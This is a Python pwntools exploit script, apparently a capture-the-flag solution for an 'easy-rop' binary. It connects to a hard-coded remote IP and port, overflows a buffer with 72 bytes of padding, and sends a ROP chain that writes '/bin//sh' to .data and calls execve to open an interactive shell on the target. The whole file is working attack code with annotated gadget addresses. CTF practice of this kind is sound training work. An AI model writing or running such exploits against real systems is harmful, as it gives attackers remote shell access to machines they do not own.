#!/usr/bin/env python3
from pwn import *

def main():
	#io = process("./easy-rop") # For debugging
	io = remote("65.1.92.179",49153)
	pre_data = io.recvuntil("your name:")
	
	payload = b"A"*72 # padding

	#Writing /bin/sh
	payload += p64(0x40f4be)	# pop rsi gadget 
	payload += p64(0x004c00e0) 	# Value for rsi, rw in .data
	payload += p64(0x4175eb)	# pop rax gadget
	payload += b"/bin//sh"		# value for rax that will be written into loc of rsi, we use 2*/ for getting to 8 byte, not seven
	payload += p64(0x481e65)	# mov [rsi], rax gadget for writing string
	
	#Writing null byte into .data+0x8	
	payload += p64(0x40f4be)    # pop rsi gadget 
	payload += p64(0x004c00e0+0x8)# Value for rsi, rw in .data+0x8 so the next argument for execve
	payload += p64(0x4175eb)    # pop rax gadget
	payload += p64(0x0)       	# value for rax, so 0x0 for the array as arguments
	payload += p64(0x481e65)    # mov [rsi], rax gadget for writing string
	
		
	#Preparing syscall
	payload += p64(0x40191a)	# pop rdi gadget
	payload += p64(0x004c00e0)	# value for rdi (location of string = rsi)
	payload += p64(0x40181f)	# pop rdx gadget
	payload += p64(0x004c00e0+0x8)# Value for rdx
	payload += p64(0x4175eb)	# pop rax gadget
	payload += p64(0x3b)		# rax value = (dec) 59 = execve syscall number
	payload += p64(0x40f4be)	# pop rsi gadget 
	payload += p64(0x004c00e0+0x8) 	# value for rsi 
	
	#Make syscall
	payload += p64(0x4012d3) 	# syscall gadget	
	

	input("Send payload")
	io.sendline(payload)
	io.interactive()
	
	io.close()

if __name__=="__main__":
	main()
